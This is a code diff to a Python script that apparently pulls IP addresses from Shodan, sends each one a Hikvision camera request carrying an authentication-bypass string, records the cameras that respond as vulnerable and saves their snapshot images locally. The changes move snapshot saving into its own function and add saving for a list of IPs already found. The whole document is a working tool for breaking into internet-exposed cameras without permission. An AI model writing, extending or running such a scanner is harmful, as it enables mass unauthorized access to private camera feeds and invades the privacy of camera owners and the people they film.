@@ -1,4 +1,4 @@
-#!/bin/python
+#!/bin/python3
 
 import shodan, requests, sys, time, pathlib, tkinter, io, urllib.request
 from PIL import Image
@@ -70,20 +70,27 @@ def checkIPs():
     for ip in ipList:
         try:
             response = requests.get('http://'+ip+SNAPSHOT_SUFFIX+HIKVISION_MAGIC_AUTH, timeout=custom_timeout)
-            if response.status_code == 200: 
-                if save_pictures:
-                        pathlib.Path("snap").mkdir(parents=True, exist_ok=True)
-                        with open('snap/'+ip+'.jpg', 'wb' ) as f:
-                            f.write(response.content)
-                            f.close()
-
-                ipVuln.append(ip)
+            if save_pictures:
+                saveSnapshot(ip, response)    
+            ipVuln.append(ip)
         except requests.exceptions.RequestException as e:
             pass
         print("Scanned {} of {} IPs.".format(idx,len(ipList)), end="\r")
         idx+=1
     print("Found {} vulnerable cameras".format(len(ipVuln)))
 
+def saveSnapshot(ip, response=None):
+    if response is None:
+        try:
+            response = requests.get('http://'+ip+SNAPSHOT_SUFFIX+HIKVISION_MAGIC_AUTH, timeout=custom_timeout)
+        except:
+            pass
+
+    if response is not None and response.status_code == 200:
+        pathlib.Path("snap").mkdir(parents=True, exist_ok=True)
+        with open('snap/'+ip+'.jpg', 'wb' ) as f:
+            f.write(response.content)
+            f.close()
 
 def saveVulnInFile():
     pathlib.Path("vuln").mkdir(parents=True, exist_ok=True)
@@ -212,6 +219,14 @@ def main():
         readFile()
         if not skip_vuln_check:
             checkIPs()
+        elif save_pictures:
+            idx = 1
+            for ip in ipVuln:
+                print("Saving {} of {} snapshots.".format(idx,len(ipVuln)), end="\r")
+                saveSnapshot(ip)
+                idx += 1
+
+
     if len(ipVuln) > 0 and save_vuln_in_file:
         saveVulnInFile()
 
